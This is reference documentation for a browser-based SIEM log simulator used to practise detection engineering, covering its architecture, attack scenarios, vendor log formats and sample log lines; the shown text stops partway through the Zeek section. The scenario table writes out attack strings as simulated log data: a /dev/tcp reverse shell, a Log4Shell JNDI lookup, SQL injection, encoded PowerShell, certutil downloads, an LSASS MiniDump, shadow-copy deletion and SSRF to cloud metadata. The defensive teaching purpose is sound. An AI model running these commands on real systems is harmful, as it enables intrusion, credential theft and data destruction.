# APEX JediSyslogger — Technical Documentation

A browser-based **SIEM log-ingestion simulator** with an optional zero-dependency
Node backend for real syslog forwarding. This document is the full reference:
architecture, data model, every scenario and detection rule, the vendor log
formats, the HTTP API, configuration, and deployment.

- [1. Overview](#1-overview)
- [2. Architecture](#2-architecture)
- [3. Event data model](#3-event-data-model)
- [4. The Syslogger (log source)](#4-the-syslogger-log-source)
- [5. Attack scenarios](#5-attack-scenarios)
- [6. Appliance log formats](#6-appliance-log-formats)
- [7. The Jedi SIEM engine](#7-the-jedi-siem-engine)
- [8. Detection rules](#8-detection-rules)
- [9. File replay](#9-file-replay)
- [10. Live forwarding & the backend API](#10-live-forwarding--the-backend-api)
- [11. Connectivity test](#11-connectivity-test)
- [12. Configuration reference](#12-configuration-reference)
- [13. Deployment](#13-deployment)
- [14. Extending the app](#14-extending-the-app)
- [15. Troubleshooting](#15-troubleshooting)

---

## 1. Overview

APEX JediSyslogger generates synthetic security telemetry and analyses it in real
time, so you can practise **detection engineering** without a live environment. It
has two halves:

| Component     | Role |
|---------------|------|
| **Syslogger** | Synthetic log source — emits RFC 3164 / RFC 5424 syslog and 24 appliance formats (18 native syslog + 4 agent-relayed + 2 API-relayed), at a configurable rate, with 42 injectable attack scenarios and file replay. |
| **Jedi**      | Miniature SIEM — parses every event, keeps rolling stats, and runs a stateful, MITRE ATT&CK-tagged detection-rule engine. |

Everything renders in the browser. The optional `server.js` backend serves the
app **and** relays generated logs as real UDP/TCP syslog to an external collector.

All traffic is synthetic. Nothing leaves the browser unless you explicitly enable
**Forward live** (which requires the backend).

---

## 2. Architecture

```
┌──────────────────────── Browser ────────────────────────┐
│                                                          │
│  Syslogger ──emit(event)──▶ Jedi.ingest(event)           │
│  (js/syslogger.js)          (js/jedi.js)                 │
│      │                          │                        │
│      │ raw line                 │ stats + alerts         │
│      ▼                          ▼                        │
│  fwd queue ······▶ POST /forward   UI render (js/ui.js)  │
│                          │         dashboard / stream    │
└──────────────────────────┼──────────────────────────────┘
                           │  (only when "Forward live" is on)
                           ▼
              ┌──────── server.js (Node) ────────┐
              │  /forward → UDP/TCP syslog ───────┼──▶ Collector / SIEM
              │  /test    → reachability probe    │    (Splunk, Graylog,
              │  static file host                 │     Wazuh, rsyslog…)
              └───────────────────────────────────┘
```

**Files**

| File | Responsibility |
|------|----------------|
| `index.html` | Markup / panel scaffold |
| `css/styles.css` | Dark SIEM theme, responsive layout |
| `js/data.js` | Random helpers, host/user/threat-intel pools, RFC 3164/5424 + vendor line formatters |
| `js/syslogger.js` | Baseline generators, attack scenarios, appliance sources, file replay, forward queue |
| `js/jedi.js` | Parsing, correlation windows, detection rules, stats, threat level |
| `js/ui.js` | Dashboard rendering, charts, config wiring, drawer |
| `server.js` | Optional backend: static host + `/forward` relay + `/test` probe |
| `samples/sample.log` | Example mixed-format log for the file-replay demo |
| `jsconfig.json` | Editor typecheck settings — read by the editor, never shipped |
| `types/globals.d.ts` | Ambient declarations for `window.JS` and Node globals |

The three engine modules are plain IIFEs that attach to a global `JS` namespace —
no build step, no bundler, no npm dependencies. Load order is data → syslogger →
jedi → ui.

`jsconfig.json` and `types/globals.d.ts` are editor-only: VS Code's bundled
TypeScript service reads them to typecheck the JavaScript in place, so no
`npm install` is required and nothing is added to what the browser loads. To run
the same check from a terminal: `npx -p typescript tsc -p jsconfig.json`.

---

## 3. Event data model

Every generated or parsed log is normalised into an **event object** before Jedi
sees it. Common fields:

| Field | Meaning |
|-------|---------|
| `id` | Random unique id |
| `ts` | Epoch ms timestamp |
| `srcType` | Source category — generic (`firewall`, `ssh`, `web`, `dns`, `vpn`, `windows`, `mail`), one of the 24 appliance keys (`paloalto`, `snort`, `bind`, `snare`, `sysmon`, `zeek`, `cloudtrail`, `okta`, …), or `file` |
| `host` / `hostIp` | Device name / management IP |
| `facility` / `severity` | Syslog numeric facility (0–23) and severity (0–7) |
| `program` / `pid` | Process / tag |
| `srcIp` / `dstIp` / `srcPort` / `dstPort` / `proto` | Network 5-tuple (where relevant) |
| `action` | `ALLOW` / `DENY` / `accept` / `dropped` / etc. |
| `bytes` | Flow size |
| `user`, `eventId`, `url`, `method`, `status`, `domain` | Source-specific fields |
| `vendor` | Appliance vendor key (drives the native raw formatter) |
| `threatSig` / `threatSev` | Appliance IPS/WAF signature + severity (drives detection) |
| `message` | Human-readable summary shown in the stream |
| `raw` | The exact wire line (RFC 3164/5424 or vendor format), shown in the drawer |
| `collector` | The configured `ip:port` destination label |

Syslog severity mapping (lower = more severe): `0 emerg, 1 alert, 2 crit,
3 err, 4 warning, 5 notice, 6 info, 7 debug`.

**Source-specific fields.** A formatter reads only the fields its vendor needs, so
some sources add their own. The ones a detection rule reads:

| Field | Source | Meaning |
|-------|--------|---------|
| `sigName` | `snort`, `ciscoftd` | Signature text **for display**. Deliberately separate from `threatSig`: an IDS names every alert, including benign priority-3 noise, but only `threatSig` raises an alert. |
| `gid` / `sid` / `rev` / `classification` / `priority` | `snort`, `ciscoftd` | Snort rule identity and priority |
| `termState` / `timers` / `conns` | `haproxy` | 4-char termination state (`----` clean, `PR--` proxy-denied) and the `Tq/Tw/Tc/Tr/Tt` tuple |
| `qtype` / `qflags` / `clientHandle` | `bind` | DNS query type, trailing flag chars, `@0x…` client handle |
| `iseCategory` / `msgCode` / `mac` / `nasName` / `failReason` | `ciscoise` | Logging category, message code (`5200` pass / `5400` fail), supplicant MAC, NAS, failure text |
| `totalSeg` / `segNum` / `iseSeq` | `ciscoise` | ISE's datagram-segmentation header |
| `criticality` / `logName` / `logType` / `snareCounter` | `snare` | Snare agent fields wrapping the Windows event |
| `auditType` / `auditSerial` / `auditTs` / `auditBody` | `auditd` | Record type (`SYSCALL`/`EXECVE`), and the shared `audit(epoch:serial)` join key — **identical across every record of one event** |
| `auid` / `uid` / `comm` | `auditd` | Login identity (survives `su`/`sudo`), effective uid, command |
| `pfAction` / `smtpCode` / `pfReason` | `postfix` | `reject`/`sent`, SMTP reply code, reason text |
| `sysmonType` / `processGuid` / `processId` / `image` | `sysmon` | Event-ID name, the GUID that survives PID reuse, and the process image path |
| `sysmonFields` | `sysmon` | Per-event-ID fields, pre-rendered as `key="value"` strings — every Sysmon event ID has a different schema, so the formatter only supplies the common header |
| `zeekPath` / `uid` / `zeekFields` | `zeek` | Log path (`conn`/`dns`/`ssl`), the connection uid that joins them, and the path's positional field list |
| `eventName` / `eventSource` / `requestParameters` | `cloudtrail` | The API call, its service, and its arguments — `cloud-threat` branches on the name and inspects the parameters |
| `identityType` / `arn` / `accountId` / `region` | `cloudtrail` | `userIdentity` block: who made the call, in which account and region |
| `oktaEventType` / `outcome` / `outcomeReason` / `factor` | `okta` | Event type, `SUCCESS`/`FAILURE`, the reason text, and the MFA factor used |
| `country` / `city` / `lat` / `lon` / `isProxy` | `okta` | `client.geographicalContext` — what makes impossible travel detectable at all |

---

## 4. The Syslogger (log source)

`Syslogger(sink)` emits events to a `sink` callback (Jedi's `ingest`).

**Baseline traffic** — a weighted mix of benign events from firewall, web, ssh,
dns, windows, and vpn, produced on a 100 ms tick at the configured **events per
second** (0–60). Fractional rates accumulate so e.g. 0.5 eps emits one event
every two seconds.

**Key methods**

| Method | Purpose |
|--------|---------|
| `start()` / `stop()` | Run/pause the baseline generator |
| `setEps(n)` | Baseline rate |
| `setFormat('rfc3164' \| 'rfc5424')` | Wire format for the generic sources |
| `injectScenario(id)` | Fire an attack/appliance burst (works even while stopped) |
| `setMaxEvents(n \| null)` | Total volume cap (auto-stops at the cap) |
| `setCollector(ip, port)` | Forwarding/test destination |
| `loadFile(lines, name)` / `setFileMode(bool)` / `setLoop(bool)` | File replay |
| `setForwarding(bool)` / `setForwardProto('udp' \| 'tcp')` | Live forwarding |

The **RFC 3164** vs **RFC 5424** toggle only affects the generic sources;
appliance events always use their native vendor format.

---

## 5. Attack scenarios

**42** scenarios live under the **Attack ›** menu. Each scenario's `build()`
returns a *burst* of event partials crafted to trip a specific detection rule, so
every button demonstrably lights up the dashboard. A burst can be injected even
while the baseline generator is stopped, and its events are spread 30–90 ms apart
so the correlation windows see them as live traffic.

Scenarios are defined in `js/syslogger.js` in two objects that are merged into a
single `SCENARIOS` map: the original eight in `SCENARIOS` and the additional
thirty-four in `MORE_ATTACKS`. The **ID** column below is the internal key passed to
`injectScenario(id)`; it is what the `Attack ›` buttons call.

| ID | Scenario | What the burst emits | Fires rule | ATT&CK |
|----|----------|----------------------|-----------|--------|
| `ssh-bruteforce` | SSH Brute Force | 12–20 `sshd` *Failed password* lines from one threat-intel IP; ~30 % of the time a trailing *Accepted password* | `ssh-bruteforce`, `brute-success` | T1110 / T1078 |
| `port-scan` | Port Scan | 20–30 firewall **DENY** events to distinct dst ports on one internal host | `port-scan` | T1046 |
| `sql-injection` | SQL Injection | 3–5 nginx requests with SQLi payloads (`' OR '1'='1`, `UNION SELECT`, `; DROP TABLE`, `SLEEP(5)`) | `sql-injection` | T1190 |
| `c2-beacon` | C2 Beacon | 4–7 firewall **ALLOW** flows from an internal victim to a known-bad IP on 443 / 8443 / 4444 | `c2-beacon` | T1071 |
| `data-exfil` | Data Exfiltration | one firewall **ALLOW** flow of 220–900 MB outbound | `data-exfil` | T1048 |
| `dns-tunneling` | DNS Tunneling | 4–8 DNS **TXT** queries with 40–60-char hex labels under a known-bad domain | `dns-tunneling` | T1071.004 |
| `priv-esc` | Privilege Escalation | a `sudo … USER=root ; COMMAND=/bin/bash` event **plus** a Windows **4672** SeDebugPrivilege event | `priv-esc` | T1068 |
| `malware-detected` | Malware / IDS Hit | one Suricata alert (Cobalt Strike / Emotet / Log4j / PowerShell EncodedCommand) | `ids-malware` | T1204 |
| `log4shell` | Log4Shell RCE | 2–3 web requests carrying `${jndi:ldap://<bad-ip>:1389/Exploit}` in the URL / User-Agent | `web-exploit` | T1190 |
| `xss` | XSS Injection | 2–3 web requests with `<script>` / `onerror=` payloads | `web-exploit` | T1059 |
| `dir-traversal` | Path Traversal / LFI | 2–3 web requests for `../../../../etc/passwd`, `/etc/shadow`, `win.ini` | `web-exploit` | T1083 |
| `web-shell` | Web Shell | 2–3 **POST**s to `shell.php?cmd=`, `c99.php`, `webshell.aspx` | `web-exploit` | T1505.003 |
| `vuln-scan` | Vuln Scan | 5–8 GETs to sensitive paths (`/admin`, `/.git/config`, `/.env`…) with a scanner UA (sqlmap / Nikto / Nessus / Nmap) | `web-exploit` | T1595 |
| `reverse-shell` | Reverse Shell | one shell event `bash -i >& /dev/tcp/<bad-ip>/4444 0>&1` | `reverse-shell` | T1059 |
| `powershell-enc` | Malicious PowerShell | Windows **4688** with `powershell -nop -w hidden -enc <base64>` | `susp-powershell` | T1059.001 |
| `rdp-bruteforce` | RDP Brute Force | 10–16 Windows **4625** LogonType 10 failures from one threat-intel IP | `windows-threat` | T1110 |
| `password-spray` | Password Spray | **4625** across 10 distinct accounts with one password, from one IP | `windows-threat` | T1110.003 |
| `kerberoasting` | Kerberoasting | **4769** RC4 (`0x17`) service-ticket requests for 4 service accounts | `windows-threat` | T1558.003 |
| `dcsync` | DCSync | **4662** with `DS-Replication-Get-Changes-All` replication rights | `windows-threat` | T1003.006 |
| `new-admin` | New Admin Account | **4720** (account created) **+ 4732** (added to Administrators) | `windows-threat` | T1136 |
| `log-cleared` | Audit Log Cleared | **1102** security audit log cleared | `windows-threat` | T1070.001 |
| `pass-the-hash` | Pass-the-Hash | **4624** LogonType 9 / NTLM logon | `windows-threat` | T1550.002 |
| `ransomware` | Ransomware | **4688** `vssadmin delete shadows` + `bcdedit … recoveryenabled no` + **4663** mass `.locked` rename | `ransomware` | T1486 |
| `cryptomining` | Cryptomining | DNS query to a mining pool **plus** a firewall flow to `stratum+tcp://<pool>:3333` | `cryptomining` | T1496 |
| `ddos-synflood` | SYN Flood (DDoS) | 8–12 firewall **DENY** SYN-flood events to one target from spoofed IPs | `dos-flood` | T1498 |
| `phishing` | Phishing Email | one postfix event, `spf=fail dkim=fail dmarc=fail` + a risky attachment (`.exe/.iso/.js/.docm`) | `phishing` | T1566 |
| `lsass-dump` | LSASS Credential Dump | Sysmon **1** `rundll32 comsvcs.dll, MiniDump` + Sysmon **10** handle into `lsass.exe`, `GrantedAccess 0x1410` | `cred-dumping` | T1003.001 |
| `sched-task-persist` | Scheduled Task Persistence | Sysmon **1** `schtasks /create … /sc minute /ru SYSTEM` + Windows **4698** | `persistence-mech` | T1053.005 |
| `runkey-persist` | Run-Key Persistence | Sysmon **11** drop into `C:\Users\Public\Libraries` + Sysmon **13** write under `CurrentVersion\Run` | `persistence-mech` | T1547.001 |
| `lolbin-download` | LOLBin Download (certutil) | Sysmon **1** `certutil -urlcache -split -f`, **3** the fetch itself, **1** `certutil -decode` | `lolbin-abuse` | T1105 |
| `defender-disabled` | Defender Disabled | Sysmon **1** `Set-MpPreference -DisableRealtimeMonitoring $true` + Windows **4688** `Add-MpPreference -ExclusionPath` | `security-tooling-disabled` | T1562.001 |
| `bloodhound` | BloodHound AD Recon | Sysmon **1** `SharpHound.exe --CollectionMethods All` + 11–15 Windows **4662** directory-object reads | `ad-recon` | T1087.002 |
| `psexec-lateral` | PsExec Lateral Movement | Windows **4624** LogonType 3 (NTLM) + **5140** `ADMIN$` + **7045** `PSEXESVC` service install | `windows-threat` | T1021.002 |
| `golden-ticket` | Golden Ticket | Windows **4769** with a blank `Account Domain: -` and an AES256 ticket outside policy | `windows-threat` | T1558.001 |
| `asrep-roast` | AS-REP Roasting | 3–4 Windows **4768** with `Pre-Authentication Type: 0` and an RC4 (`0x17`) ticket | `windows-threat` | T1558.004 |
| `cloud-logging-disabled` | Cloud Logging Disabled | CloudTrail `StopLogging` + `DeleteTrail` + GuardDuty `DeleteDetector` from a threat-intel IP | `cloud-threat` | T1562.008 |
| `cloud-iam-backdoor` | Cloud IAM Backdoor | CloudTrail `CreateUser` + `CreateAccessKey` + `CreateLoginProfile` for a new principal | `cloud-threat` | T1098.001 |
| `cloud-privesc` | Cloud Privilege Escalation | CloudTrail `AttachUserPolicy` (`AdministratorAccess`) + `PutUserPolicy` with `"Action":"*"` | `cloud-threat` | T1098.003 |
| `s3-exposure` | S3 Bucket Exposed | CloudTrail `PutPublicAccessBlock` (off) + `PutBucketAcl` `public-read`/`AllUsers` + `PutBucketPolicy` `Principal:*` | `cloud-threat` | T1530 |
| `impossible-travel` | Impossible Travel | two Okta `user.session.start` **successes** minutes apart from Sydney and Moscow / Lagos / Shenzhen | `identity-threat` | T1078.004 |
| `mfa-fatigue` | MFA Fatigue (Push Bombing) | 8–12 Okta `auth_via_mfa` **FAILURE** (`FAILED_PUSH_VERIFY_REJECTED`) then one **SUCCESS** — the user gives in | `mfa-fatigue` (twice) | T1621 |
| `ssrf-metadata` | SSRF → Cloud Metadata | 1–2 web requests proxying to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | `web-exploit` | T1552.005 |

Most bursts raise exactly **one** alert. `mfa-fatigue` deliberately raises two — the
push-bombing burst, then the approval that follows it — the same shape as
`ssh-bruteforce` → `brute-success`. The web scenarios alert per request, because
each request is independently an attack.

The known-bad IPs and domains used above come from `THREAT_INTEL` in `js/data.js`
(e.g. `185.220.101.44`, `kx7z2q-c2.badnet.ru`); the Jedi engine treats them as
threat-intel matches.

---

## 6. Appliance log formats

**24** sources live under the **Appliance logs ›** menu. Each burst mixes benign
events with malicious ones, and every event is rendered in the vendor's **real
wire format** (still wrapped in a syslog `<PRI>` header) by the matching formatter
in `js/data.js` → `VENDOR_FORMATTERS`. The RFC 3164 / 5424 toggle does **not**
apply — real appliances have fixed formats. The **ID** column is the internal key
the `Appliance logs ›` buttons pass to `injectScenario(id)`.

Selecting an appliance also **scopes the live stream** to it. `setApplianceSources(ids)`
holds the selected ids; while the list is non-empty `_emitBaseline()` defers to
`_emitAppliance()`, which drips one selected appliance's burst out an event at a
time (so the EPS setting still holds) instead of drawing from the generic
`BASELINE` mix. Streamed bursts carry only their leading routine traffic, with a
whole burst — malicious tail included — let through every ~30 s, so a sustained
feed doesn't flood **Detections**. A file replay still takes precedence, and
clicking a selected appliance again (or **clear** / **Reset**) restores the mix.

`Syslogger.scenarioList()` exposes a **`transport`** field (`native` | `agent` |
`api`, defaulting to `native`). 18 of the 24 sources are `native` — the device
speaks syslog itself. Six are not, and say so with a badge on their button and in
the hover title.

**`agent`** — the telemetry exists locally but something else has to put it on the
wire:

- **`snare`** — Windows has no native syslog at all; a Snare or NXLog agent reads
  the Event Log and relays it.
- **`sysmon`** — Sysmon writes to its own channel
  (`Microsoft-Windows-Sysmon/Operational`), so it rides the same agent as the
  Security channel; the payload here is NXLog's `key=value` rendering.
- **`auditd`** — the kernel audit daemon writes to its own socket; the
  `audisp-syslog` plugin is what puts it on the wire.
- **`zeek`** — Zeek writes log *files* under `/opt/zeek/logs/current`, one per
  path; Filebeat or `rsyslog imfile` ships them.

**`api`** — the product emits nothing at all on a socket; a connector polls it and
re-emits the JSON:

- **`cloudtrail`** — records are delivered to S3 or EventBridge, not syslog.
- **`okta`** — the System Log is read from `GET /api/v1/logs`.

The distinction is deliberate: this is a tool for learning log ingestion, so a
source that cannot actually reach a collector without an agent or a connector must
not be presented as though it could.

Five detection paths cover the malicious events in each burst:

- Appliances that carry an IPS/WAF **`threatSig`** field (Palo Alto, FortiGate,
  Sophos, SonicWall, Zscaler, F5, Cisco FTD, Snort, HAProxy, Postfix, CEF, LEEF)
  fire the **`appliance-threat`** rule, which maps the signature text to an ATT&CK
  technique.
- Pure firewall appliances with no signature field (Cisco ASA, Check Point,
  pfSense, Juniper) route their malicious event through the generic
  **`c2-beacon`** rule instead (internal host → threat-intel IP). **Zeek** lands
  here too: its `conn.log` beacon to a known-bad IP is the same evidence.
- **Correlation-driven** sources carry no signature at all and rely on a stateful
  rule counting a burst: Cisco ISE (`radius-brute`), BIND 9 (`dns-tunneling`),
  Snare (`windows-threat`) and Okta (`mfa-fatigue`). These deliberately alert
  **once** per burst rather than once per line.
- **Behavioural** sources are judged on what the telemetry *describes* rather than
  on a vendor verdict: Sysmon's handle request into `lsass.exe` fires
  **`cred-dumping`**, and CloudTrail's control-plane call fires **`cloud-threat`**.
- **Reused rules.** `snare` is the same Windows Event Log as the `windows` baseline
  source — same event IDs, different transport and wire format — so it feeds the
  existing **`windows-threat`** rule instead of a cloned one. `auditd` gets its own
  **`auditd-rootshell`** rule.

| ID | Appliance | Format | Detection | Malicious signature / trigger |
|----|-----------|--------|-----------|-------------------------------|
| `paloalto` | Palo Alto (PAN-OS) | CSV | `appliance-threat` | Log4j RCE (91991), SQLi (20568), EternalBlue (40007), Dir Traversal (31337) |
| `fortigate` | FortiGate (FortiOS) | `key=value` | `appliance-threat` | Log4j (51006), SMB OOB read (41435), Cobalt Strike (46774), SQLi (15621) |
| `ciscoasa` | Cisco ASA | `%ASA-lvl-id` | `c2-beacon` | outbound *Built* connection to a known-bad IP (+ inbound `106023` Deny) |
| `checkpoint` | Check Point | `k=v;` | `c2-beacon` | *Accept* to a flagged destination (+ a `Drop`) |
| `sophos` | Sophos XG | `key=value` | `appliance-threat` | SQL-Injection-Attack, Log4j (CVE-2021-44228), Suspicious-Executable-Download |
| `pfsense` | pfSense | filterlog CSV | `c2-beacon` | *pass out* to a flagged destination |
| `juniper` | Juniper SRX | RT_FLOW | `c2-beacon` | RT_FLOW session *created* to a flagged destination |
| `sonicwall` | SonicWall | `id/sn key=value` | `appliance-threat` | Suspected Port Scan, Possible SYN Flood, Malformed packet |
| `zscaler` | Zscaler ZIA | NSS `key=value` | `appliance-threat` | Win32.Trojan.Emotet, JS.Downloader.GenericKD, EICAR-Test-File, Phishing.Kit |
| `f5` | F5 BIG-IP ASM | comma `key=value` | `appliance-threat` | SQL-Injection, XSS, Command-Execution, Predictable-Resource-Location |
| `ciscoftd` | Cisco FTD (Firepower) | `%FTD-lvl-id` + `Key: Value` | `appliance-threat` | `430001` intrusion: Log4j (58722), Emotet CNC (47332), SQLi (41274) |
| `ciscoise` | Cisco ISE (RADIUS) | segmented hdr + `key=value` | `radius-brute` | 7–10 `CISE_Failed_Attempts` (`5400`) for one MAC — no signature, correlated |
| `snort` | Snort 3 (IDS) | `[gid:sid:rev]` tokens | `appliance-threat` | Log4j (58722), Cobalt Strike (29889), SSH brute (19559), SQLi (13990) |
| `haproxy` | HAProxy | positional + timers/flags | `appliance-threat` | 4× `PR--` 403-denied probes (`/.env`, `/wp-admin/`, …) from one bad IP |
| `bind` | BIND 9 (DNS) | `named` query log | `dns-tunneling` | 42–56-char DGA label under `tunnel.badnet.ru` (TXT) + a threat-intel domain |
| `postfix` | Postfix (mail) | prose + `key=<value>` | `appliance-threat` | Spamhaus Blocklist Hit (554), Invalid Sender Domain (550) |
| `snare` | Windows Event Log (Snare) — **agent** | TAB-delimited `MSWinEventLog` | `windows-threat` | 9–12 × **4625** failed logons for one account from one bad IP (+ benign 4624/4688) |
| `sysmon` | Sysmon (Windows) — **agent** | NXLog `key=value` | `cred-dumping` | **10** `ProcessAccess` into `lsass.exe`, `GrantedAccess 0x1438` (+ benign 1/3/11) |
| `auditd` | Linux auditd — **agent** | `type=… msg=audit(ts:serial)` | `auditd-rootshell` | `SYSCALL` with `auid=1000 uid=0 key="rootshell"` + its `EXECVE` |
| `zeek` | Zeek (NSM) — **agent** | TAB-separated `conn` / `dns` / `ssl` | `c2-beacon` | 4–6 `conn.log` flows to one known-bad IP at a 60 s cadence with near-identical byte counts, plus the `ssl.log` line carrying Cobalt Strike's default JA3 |
| `cloudtrail` | AWS CloudTrail — **api** | JSON record | `cloud-threat` | one of `StopLogging`, `CreateAccessKey`, `PutBucketAcl public-read`, `AttachUserPolicy AdministratorAccess` (+ benign Describe/List calls) |
| `okta` | Okta System Log — **api** | JSON record | `mfa-fatigue` | 7–10 × `auth_via_mfa` `FAILED_PUSH_VERIFY_REJECTED` for one user from one bad IP — no signature, correlated |
| `cef` | CEF (generic ArcSight) | `CEF:0\|…` | `appliance-threat` | Brute Force Attack, Malware Communication, Data Exfiltration Attempt |
| `leef` | LEEF (generic QRadar) | `LEEF:2.0\|…` | `appliance-threat` | Port Scan, Suspect Data Loss, Botnet C2 Communication |

### Example wire lines

Representative malicious lines (values such as timestamps, serials, and session
IDs are randomised at generation time):

**Palo Alto** THREAT (CSV):

```
<130>Jul 16 10:22:41 PA-3220 1,2026/07/16 10:22:41,012345678901,THREAT,vulnerability,0,2026/07/16 10:22:41,185.220.101.44,10.10.1.11,0.0.0.0,0.0.0.0,untrust-to-dmz,,,web-browsing,vsys1,untrust,dmz,ethernet1/1,ethernet1/2,forward-log,2026/07/16 10:22:41,123456,1,54321,443,0,0,0x0,tcp,reset-both,"Apache Log4j Remote Code Execution Vulnerability(91991)",code-execution,critical,client-to-server
```

**FortiGate** IPS (`key=value`):

```
<162>date=2026-07-16 time=10:22:41 devname="FGT60F" devid="FGT12345TK1234567" logid="0419016384" type="utm" subtype="ips" level="critical" vd="root" srcip=185.220.101.44 srcport=51000 dstip=10.10.1.11 dstport=443 proto=6 action="dropped" policyid=12 service="HTTPS" attack="Apache.Log4j.Error.Remote.Code.Execution" attackid=51006 severity="critical" msg="ips dropped …"
```

**Cisco ASA** inbound deny (`%ASA-lvl-id`):

```
<164>Jul 16 10:22:41 ASA-5516 : %ASA-4-106023: Deny tcp src outside:185.220.101.44/51000 dst inside:10.10.1.11/3389 by access-group "outside_access_in"
```

**CEF** (generic ArcSight):

```
<146>Jul 16 10:22:41 arcsight-conn CEF:0|Security|ThreatManager|1.0|912|Malware Communication|9|src=185.220.101.44 dst=10.10.1.11 spt=51000 dpt=443 proto=TCP act=blocked
```

**Cisco FTD** `430001` intrusion (`%FTD-lvl-id` + `Key: Value` — note the space
after each colon, which is what separates it from PAN-OS CSV and FortiOS `k=v`):

```
<161>Jul 16 2026 22:05:01 firepower %FTD-1-430001: Protocol: tcp, SrcIP: 5.188.206.130, DstIP: 172.17.214.247, SrcPort: 7374, DstPort: 443, Message: "MALWARE-CNC Win.Trojan.Emotet outbound connection", Classification: A Network Trojan was detected, Priority: 1, GID: 1, SID: 47332, InlineResult: Blocked
```

**Cisco ISE** failed RADIUS auth. After the category comes ISE's segmented header
— `msg_id total_seg seg_num` (`0000664767 1 0`): real ISE splits long messages
across multiple datagrams that a collector must reassemble.

```
<179>Jul 16 22:05:00 ise-node-02 CISE_Failed_Attempts 0000664767 1 0 2026-07-16 22:05:00.959 +02:00 0001711172 5400 NOTICE Failed-Attempt: Authentication failed, ConfigVersionId=12, Device IP Address=10.0.0.23, DestinationIPAddress=10.10.0.30, DestinationPort=1812, UserName=oracle@corp.local, Protocol=Radius, NetworkDeviceName=SW-ACCESS-3850, NAS-IP-Address=10.0.0.23, Service-Type=Framed, Calling-Station-ID=C7-D6-35-CC-BB-36, NAS-Port-Type=Ethernet, FailureReason=22040 Wrong password or invalid shared secret
```

**Snort 3** (`alert_syslog`) — `[gid:sid:rev]` then bracketed tokens. Priority-3
noise events carry no `threatSig` and deliberately raise no alert:

```
<185>Jul 16 22:05:00 snort-sensor-01 snort[67973]: [1:13990:12] "SQL union select possible sql injection attempt" [Classification: Web Application Attack] [Priority: 1] {TCP} 45.83.193.12:4600 -> 10.17.78.191:443
```

**HAProxy** — served vs. proxy-denied. The `Tq/Tw/Tc/Tr/Tt` timer tuple and the
4-character **termination state** are the signal: `----` is a clean exchange,
`PR--` means the proxy itself denied the request (`<NOSRV>`, so it never reached
a backend, and the timers are `-1`):

```
<134>Jul 16 22:05:00 haproxy-02 haproxy[2831]: 77.145.132.91:14561 [16/Jul/2026:22:05:00.805] http-in static/srv2 8/0/23/75/66 200 22640 - - ---- 15/5/1/0/0 0/0 {shop.example.com} {} "GET /health HTTP/1.1"
<132>Jul 16 22:05:00 haproxy-02 haproxy[24734]: 91.219.236.19:32993 [16/Jul/2026:22:05:00.936] http-in http-in/<NOSRV> -1/-1/-1/-1/0 403 188 - - PR-- 9/1/0/0/0 0/0 {shop.example.com} {} "GET /admin/config.php HTTP/1.1"
```

**BIND 9** DGA/tunnel query — `@0x…` client handle, and the trailing flag string
(`+` RD, `E(0)` EDNS, `T` TCP, `D` DNSSEC):

```
<28>Jul 16 22:05:01 dns-01 named[2293]: client @0x7167c821 192.168.15.161#28383 (1hbbvfodpnemlc5421y4ck9yszoz1bp0ju6abibk4v4j71o86fwyjyg.tunnel.badnet.ru): query: 1hbbvfodpnemlc5421y4ck9yszoz1bp0ju6abibk4v4j71o86fwyjyg.tunnel.badnet.ru IN TXT +E(0)
```

**Postfix** reject — prose with `key=<value>` angle-bracket pairs (`mail` facility):

```
<20>Jul 16 22:05:01 mail-gw-01 postfix/smtpd[11030]: NOQUEUE: reject: RCPT from unknown[91.219.236.19]: 550 Sender address rejected: Domain not found; from=<bnev0un1@mail.dark-pool.su> to=<www-data@corp.local> proto=SMTP helo=<Static-IP-9121923619>
```

**Windows Event Log via Snare** — failed logon (`4625`). The fields are
**TAB-separated** (shown here as real tabs), starting with the literal
`MSWinEventLog` marker. Windows emits no syslog itself: a Snare or NXLog agent
produces this line, which is why the source is badged `agent`:

```
<188>Jul 16 22:44:11 WIN-DC01 MSWinEventLog	4	Security	47258	Thu Jul 16 22:44:11 2026	4625	Microsoft-Windows-Security-Auditing	ftpuser	N/A	Failure Audit	WIN-DC01	Logon		An account failed to log on. Account Name: ftpuser Logon Type: 3 Failure Reason: Unknown user name or bad password. Source Network Address: 91.219.236.19 Status: 0xC000006D	47258
```

**Linux auditd** — a root shell from an unprivileged login, relayed by
`audisp-syslog`. Note that both records carry the **identical**
`audit(1784234651.263:6581)` stamp: that shared epoch-and-serial is the join key a
collector uses to stitch the `SYSCALL` and `EXECVE` records back into one event.
`auid=1000` (the login identity, which survives `su`/`sudo`) together with `uid=0`
is the signal — `key="rootshell"` is the local audit rule that flagged it:

```
<11>Jul 16 22:44:11 srv-app-02 audispd[2225]: type=SYSCALL msg=audit(1784234651.263:6581): arch=c000003e syscall=59 success=yes exit=0 ppid=5331 pid=15491 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 tty=pts1 ses=3 comm="bash" exe="/bin/bash" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="rootshell"
<11>Jul 16 22:44:11 srv-app-02 audispd[2225]: type=EXECVE msg=audit(1784234651.263:6581): argc=3 a0="bash" a1="-i" a2="-p"
```

**Sysmon** — a handle request into LSASS (`EventID 10`), relayed by NXLog's
`key=value` output. The header fields are common to every Sysmon record; everything
from `SourceImage` on is specific to event ID 10. `GrantedAccess` is the whole
story: `0x1410` is `VM_READ | QUERY_INFORMATION`, exactly what a memory dump needs
and nothing a normal process asks of LSASS:

```
<186>Aug 13 14:22:09 WIN-DC01 Sysmon[2618]: EventID=10 EventType="Process accessed" UtcTime="2026-08-13T12:22:09.325Z" Computer="WIN-DC01" ProcessGuid="{c4519883-ad88-42ef-8677-b6bf96815264}" ProcessId=4902 Image="C:\Windows\System32\rundll32.exe" User="CORP\jdoe" SourceImage="C:\Windows\System32\rundll32.exe" TargetImage="C:\Windows\System32\lsass.exe" GrantedAccess="0x1410" CallTrace="UNKNOWN(00007FF9C0D2A1B4)|dbgcore.dll+7A1C|comsvcs.dll+6B4E"
```

**Zeek** — `conn.log` and `ssl.log` data lines, **TAB-separated** (shown here as
real tabs) with no header block: each path has a fixed positional field list, which
is why the syslog tag carries the path (`zeek_conn`, `zeek_ssl`). Field order for
`conn` is `ts uid orig_h orig_p resp_h resp_p proto service duration orig_bytes
resp_bytes conn_state local_orig local_resp missed_bytes history orig_pkts
orig_ip_bytes resp_pkts resp_ip_bytes`. The two lines share a `uid`, which is how
Zeek links a connection to its protocol analysis — here a 60 s beacon cadence with
